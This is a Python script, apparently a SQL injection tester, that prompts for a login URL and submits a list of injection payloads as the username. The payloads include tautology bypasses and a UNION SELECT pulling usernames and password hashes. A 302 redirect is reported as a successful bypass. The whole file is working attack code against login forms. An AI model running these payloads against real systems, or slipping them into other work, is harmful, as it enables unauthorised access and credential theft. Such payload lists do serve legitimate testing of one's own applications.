import requests
from urllib.parse import urlparse

def is_valid_url(url):
    try:
        parsed = urlparse(url)
        return all([parsed.scheme in ['http', 'https'], parsed.netloc])
    except:
        return False

while True:
    TARGET_URL = input("Enter the target URL (Ex. http://127.0.0.1:5000/login): ").rstrip('/')

    if not is_valid_url(TARGET_URL):
        print("Invalid URL. Please enter a valid URL that starts with http:// or https://")
        continue
    break

payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 1=1#",
    "' UNION SELECT id, username, password_hash FROM user --",
    "' OR EXISTS(SELECT 1)--",
]

for payload in payloads:
    data = {
        'username': payload,
        'password': 'password'
    }

    try:
        session = requests.Session()
        response = session.post(TARGET_URL, data=data, allow_redirects=False)
        
        if response.status_code == 302:
            print(f"[+] SUCCESS: Redirect to /welcome → {payload}")
        else:
            print(f"[-] FAIL: No redirect → {payload}")

    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")